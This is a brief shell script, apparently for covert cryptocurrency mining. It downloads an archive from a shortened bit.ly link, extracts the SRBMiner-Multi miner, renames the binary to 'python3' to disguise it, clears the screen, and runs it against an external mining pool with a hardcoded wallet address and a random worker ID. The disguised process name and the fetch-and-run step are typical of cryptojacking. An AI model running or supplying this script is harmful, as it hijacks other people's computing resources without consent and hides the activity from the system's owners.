
wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI python3

nomer=$((RANDOM % 50 + 1))

clear

./python3 --algorithm rx/0 --pool luckyynr.us.to:8080 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
